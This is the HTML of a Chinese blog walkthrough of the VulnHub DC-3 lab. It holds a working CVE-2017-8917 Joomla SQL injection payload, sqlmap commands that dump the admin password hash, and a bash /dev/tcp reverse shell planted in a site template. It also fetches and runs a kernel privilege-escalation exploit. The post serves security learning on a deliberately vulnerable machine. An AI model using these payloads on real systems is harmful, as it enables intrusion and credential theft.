@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>VulnHub_DC-3靶机渗透测试学习 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub_DC-3靶机渗透测试学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-06-27&nbsp;&nbsp;21:31:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 这个靶机是 <a href="https://twitter.com/@DCAU7" target="_blank" rel="noopener">@DCAU7</a> 出品的系列靶机<a href="https://www.vulnhub.com/series/dc,199/" target="_blank" rel="noopener">DC</a>中的第三个<a href="https://www.vulnhub.com/entry/dc-32,312/" target="_blank" rel="noopener">DC-3</a> 。</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/1.png" alt="1"></p>
+<p>这个靶机只有1个flag，而且这个靶机直接导入vmware之后会有点小问题，直接启动会报下图所示的错误：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/2.png" alt="2"></p>
+<p>解决办法很简单，<code>虚拟机 -&gt; 设置 -&gt; 硬件 -&gt; CD/DVD(IDE)</code>，选择右边的<code>高级</code>，然后将<code>IDE</code>改为<code>IDE 0:0</code>即可：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/3.png" alt="3"></p>
+<p>重新启动就可以正常进入靶机了。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>第一步还是目标靶机的ip地址获取：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -sP 192.168.247.1/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 11:08 EDT</span><br><span class="line">Nmap scan report for 192.168.247.1</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Nmap scan report for 192.168.247.2</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line">Nmap scan report for 192.168.247.210</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line">Nmap scan report for 192.168.247.216</span><br><span class="line">Host is up (0.00066s latency).</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 2.27 seconds</span><br></pre></td></tr></table></figure>
+
+<p>得到ip地址为<code>192.168.247.216</code>，然后扫描端口看开启了什么服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -p1-65535 -A 192.168.247.216 -oN /tmp/DC-3.txt</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 11:34 EDT</span><br><span class="line">Nmap scan report for 192.168.247.216</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds</span><br></pre></td></tr></table></figure>
+
+<p>从扫描结果看，只开启了一个80端口，访问该站点可以看到：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/4.png" alt="4"></p>
+<p>这个站点非常的joomla style，先用wappalyzer扫描确认一下：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/5.png" alt="5"></p>
+<p>确实是<code>joomla</code>站点。可以看到首页就有一个登录入口，但是什么账号信息都没有，所以接下来就是先找漏洞。</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="漏洞确认"><a href="#漏洞确认" class="headerlink" title="漏洞确认"></a>漏洞确认</h3><p>这是一个joomla网站，所以可以用joomla专用的漏洞扫描器<strong><a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">joomscan</a></strong>先来扫描一下。这个工具相比wpscan没有那么强大，不能枚举用户，但是也可以确定joomla版本，扫描网站目录，下面是扫描结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">  perl joomscan.pl -u http://192.168.247.216</span></span><br><span class="line">    ____  _____  _____  __  __  ___   ___    __    _  _ </span><br><span class="line">   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )</span><br><span class="line">  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( </span><br><span class="line">  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)</span><br><span class="line">                        (1337.today)</span><br><span class="line">   </span><br><span class="line">    --=[OWASP JoomScan</span><br><span class="line">    +---++---==[Version : 0.0.7</span><br><span class="line">    +---++---==[Update Date : [2018/09/23]</span><br><span class="line">    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo</span><br><span class="line">    --=[Code name : Self Challenge</span><br><span class="line">    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP</span><br><span class="line">    </span><br><span class="line">Processing http://192.168.247.216 ...</span><br><span class="line"></span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing :</span><br><span class="line">http://192.168.247.216/administrator/components</span><br><span class="line">http://192.168.247.216/administrator/modules</span><br><span class="line">http://192.168.247.216/administrator/templates</span><br><span class="line">http://192.168.247.216/images/banners</span><br><span class="line"></span><br><span class="line">[+] Checking apache info/status files</span><br><span class="line">[++] Readable info/status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://192.168.247.216/administrator/</span><br><span class="line"></span><br><span class="line">[+] Checking robots.txt existing</span><br><span class="line">[++] robots.txt is not found</span><br><span class="line"></span><br><span class="line">[+] Finding common backup files name</span><br><span class="line">[++] Backup files are not found</span><br><span class="line"></span><br><span class="line">[+] Finding common log files name</span><br><span class="line">[++] error log is not found</span><br><span class="line"></span><br><span class="line">[+] Checking sensitive config.php.x file</span><br><span class="line">[++] Readable config files are not found</span><br><span class="line"></span><br><span class="line">Your Report : reports/192.168.247.216/</span><br></pre></td></tr></table></figure>
+
+<p>发现joomla的版本是<code>3.7.0</code>，搜索该版本的漏洞，发现了一个高危漏洞<code>CVE-2017-8917</code>：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/6.png" alt="6"></p>
+<p>下面是一个poc：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.247.216/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)</span><br></pre></td></tr></table></figure>
+
+<p>确实是爆出了数据库账号<code>root@localhost</code>：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/13.png" alt="13"></p>
+<h3 id="CVE-2017-8917-Joomla-SQL注入漏洞"><a href="#CVE-2017-8917-Joomla-SQL注入漏洞" class="headerlink" title="CVE-2017-8917 Joomla SQL注入漏洞"></a>CVE-2017-8917 Joomla SQL注入漏洞</h3><p>半年前复现过这个漏洞，但是忘记写记录了，这次又遇到就顺便记录一下。这个漏洞属于高危漏洞，在用户没有登录的情况下就可以进行sql注入。</p>
+<p>poc为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(1,concat(0x3e,user()),0)</span><br></pre></td></tr></table></figure>
+
+<p>在<code>libraries\legacy\model\list.php</code>的<code>populateState()</code>方法中，会将我们传入的<code>list[fullordering]</code>保存到<code>list.fullordering</code>：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/20.png" alt="20"></p>
+<p><code>administrator/components/com_fields/models/fields.php</code>中通过<code>$listOrdering = $this-&gt;getState(‘list.fullordering’, ‘a.ordering’);getState()</code>获取了之前保存的<code>list.fullordering</code>，并进行SQL语句的拼接：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/21.png" alt="21"></p>
+<p>但采用的过滤方法<code>escape()</code>并没有将payload过滤掉：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/22.png" alt="22"></p>
+<p><code>mysqli_real_escape_string()</code>函数仅会对 NUL （ASCII 0），\n，\r，\，‘，“ 和 Control-Z进行过滤。</p>
+<p>整个程序的执行流程为：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/exec-flow.png" alt="exec-flow"></p>
+<h4 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h4><p><img src="/2020/06/27/VulnHub_DC-3/imgs/patch.png" alt="patch"></p>
+<p>官方给出的修复是不获取用户可控的list.fullordering值，改为获取list.ordering的值。</p>
+<h3 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h3><p>已经找到了可利用的sql注入漏洞，直接上sqlmap。</p>
+<p>爆数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.247.216&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/7.png" alt="7"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br></pre></td></tr></table></figure>
+
+<p>爆数据表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.247.216&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering] -D joomladb --table</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/8.png" alt="8"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">Database: joomladb</span><br><span class="line">[76 tables]</span><br><span class="line">+---------------------+</span><br><span class="line">| #__assets           |</span><br><span class="line">| #__associations     |</span><br><span class="line">| #__banner_clients   |</span><br><span class="line">| #__banner_tracks    |</span><br><span class="line">| #__banners          |</span><br><span class="line">| #__bsms_admin       |</span><br><span class="line">| #__bsms_books       |</span><br><span class="line">| #__bsms_comments    |</span><br><span class="line">| #__bsms_locations   |</span><br><span class="line">| #__bsms_mediafiles  |</span><br><span class="line">| #__bsms_message_typ |</span><br><span class="line">| #__bsms_podcast     |</span><br><span class="line">| #__bsms_series      |</span><br><span class="line">| #__bsms_servers     |</span><br><span class="line">| #__bsms_studies     |</span><br><span class="line">| #__bsms_studytopics |</span><br><span class="line">| #__bsms_teachers    |</span><br><span class="line">| #__bsms_templatecod |</span><br><span class="line">| #__bsms_templates   |</span><br><span class="line">| #__bsms_timeset     |</span><br><span class="line">| #__bsms_topics      |</span><br><span class="line">| #__bsms_update      |</span><br><span class="line">| #__categories       |</span><br><span class="line">| #__contact_details  |</span><br><span class="line">| #__content_frontpag |</span><br><span class="line">| #__content_rating   |</span><br><span class="line">| #__content_types    |</span><br><span class="line">| #__content          |</span><br><span class="line">| #__contentitem_tag_ |</span><br><span class="line">| #__core_log_searche |</span><br><span class="line">| #__extensions       |</span><br><span class="line">| #__fields_categorie |</span><br><span class="line">| #__fields_groups    |</span><br><span class="line">| #__fields_values    |</span><br><span class="line">| #__fields           |</span><br><span class="line">| #__finder_filters   |</span><br><span class="line">| #__finder_links_ter |</span><br><span class="line">| #__finder_links     |</span><br><span class="line">| #__finder_taxonomy_ |</span><br><span class="line">| #__finder_taxonomy  |</span><br><span class="line">| #__finder_terms_com |</span><br><span class="line">| #__finder_terms     |</span><br><span class="line">| #__finder_tokens_ag |</span><br><span class="line">| #__finder_tokens    |</span><br><span class="line">| #__finder_types     |</span><br><span class="line">| #__jbsbackup_timese |</span><br><span class="line">| #__jbspodcast_times |</span><br><span class="line">| #__languages        |</span><br><span class="line">| #__menu_types       |</span><br><span class="line">| #__menu             |</span><br><span class="line">| #__messages_cfg     |</span><br><span class="line">| #__messages         |</span><br><span class="line">| #__modules_menu     |</span><br><span class="line">| #__modules          |</span><br><span class="line">| #__newsfeeds        |</span><br><span class="line">| #__overrider        |</span><br><span class="line">| #__postinstall_mess |</span><br><span class="line">| #__redirect_links   |</span><br><span class="line">| #__schemas          |</span><br><span class="line">| #__session          |</span><br><span class="line">| #__tags             |</span><br><span class="line">| #__template_styles  |</span><br><span class="line">| #__ucm_base         |</span><br><span class="line">| #__ucm_content      |</span><br><span class="line">| #__ucm_history      |</span><br><span class="line">| #__update_sites_ext |</span><br><span class="line">| #__update_sites     |</span><br><span class="line">| #__updates          |</span><br><span class="line">| #__user_keys        |</span><br><span class="line">| #__user_notes       |</span><br><span class="line">| #__user_profiles    |</span><br><span class="line">| #__user_usergroup_m |</span><br><span class="line">| #__usergroups       |</span><br><span class="line">| #__users            |</span><br><span class="line">| #__utf8_conversion  |</span><br><span class="line">| #__viewlevels       |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
+
+<p>得到这么多数据表，猜测用户表是<code>#__users</code>，接着爆字段（因为<code>#__users</code>表名比较特殊，所以得用引号括住）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.247.216&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering] -D joomladb -T &#39;#__users&#39; --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/9.png" alt="9"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | numeric     |</span><br><span class="line">| name     | non-numeric |</span><br><span class="line">| password | non-numeric |</span><br><span class="line">| email    | non-numeric |</span><br><span class="line">| params   | non-numeric |</span><br><span class="line">| username | non-numeric |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>爆数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.247.216&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering] -D joomladb -T &#39;#__users&#39; -C &quot;name, username, password&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/10.png" alt="10"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------------------------------------------------------------+----------+</span><br><span class="line">| name   | password                                                     | username |</span><br><span class="line">+--------+--------------------------------------------------------------+----------+</span><br><span class="line">| admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    |</span><br><span class="line">+--------+--------------------------------------------------------------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>得到的密码是加密后的，把改密码保存进文件hash，用<code>john</code>解密：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/11.png" alt="11"></p>
+<p>得到密码<code>snoopy</code>。</p>
+<p>之前用<code>joomscan</code>扫描知道后台地址为<code>http://192.168.247.216/administrator/</code>，所以访问并用密码登录：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/12.png" alt="12"></p>
+<p>已经进入了后台，后台的资源都能控制，所以我希望可以在网站中插入恶意代码，反弹个shell之类的。直接<code>New Artical</code>之类的是肯定不行的，必须要在页面中插入源码。在joomla中，可以修改template，后台导航栏<code>Extensions-&gt;Templates</code>进入可以看到可以设置用户页面的style和templates：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/24.png" alt="24"></p>
+<p>可以看到<code>protostar</code>适用于所有页面，左边栏中选择<code>Templates</code>进入：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/25.png" alt="25"></p>
+<p>选择<code>Protostar</code>，然后修改<code>index.php</code>页面，插入反弹shell的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system (<span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.247.210/23333 0&gt;&amp;1'"</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/23.png" alt="23"></p>
+<p>访问<code>/index.php</code>，监听本机的23333端口，获得shell：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/26.png" alt="26"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先查看目标主机的内核版本以及操作系统：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-3</span>:/var/www/html<span class="variable">$</span> uname <span class="literal">-a</span></span><br><span class="line">uname <span class="literal">-a</span></span><br><span class="line">Linux DC<span class="literal">-3</span> <span class="number">4.4</span>.<span class="number">0</span><span class="literal">-21</span><span class="literal">-generic</span> <span class="comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+
+<p>内核版本是<code>ubuntu 4.4.21</code>。打开metasploit，搜索可用的本地提权漏洞：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/15.png" alt="15"></p>
+<p>exploitdb中有可用的exp，但是要注意这个exp是由两部分组成的，我将这两个exp放在我的攻击机上，然后在文件目录下开启ftp服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9000</span><br></pre></td></tr></table></figure>
+
+<p>然后将exp文件下载到靶机上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.247.210:9000&#x2F;decr.c</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.247.210:9000&#x2F;pwn.c</span><br></pre></td></tr></table></figure>
+
+<p>接着对其进行编译，但是编译过程中出现了warning，没关系，执行一下看看，发现执行失败：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/14.png" alt="14"></p>
+<p>说明这个不行，换一个 <a href="https://www.exploit-db.com/exploits/39772" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39772</a> :</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/16.png" alt="16"></p>
+<p>根据39772.txt中的poc，首先要下载提供的exp：<a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip" target="_blank" rel="noopener">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a> （得挂个代理才行）。</p>
+<p>下载后解压zip包发现有两个tar包，分别是<code>crasher.tar</code>和<code>exploit.tar</code>，这里用的是<code>exploit.tar</code>包中的exp，解压后有4个文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compile.sh</span><br><span class="line">doubleput.c</span><br><span class="line">hello.c</span><br><span class="line">suidhelper.c</span><br></pre></td></tr></table></figure>
+
+<p>同样将这4个文件上传到目标主机上，先赋予<code>compile.sh</code>文件执行权限，然后执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod -R 777 compile.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./compile.sh</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/17.png" alt="17"></p>
+<p>这里会有warning抛出，但是不要紧，可以看到生成了文件<code>doubleput</code>，接着执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./doubleput</span></span><br></pre></td></tr></table></figure>
+
+<p>这个不会立刻生效，需要一点的执行时间：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/18.png" alt="18"></p>
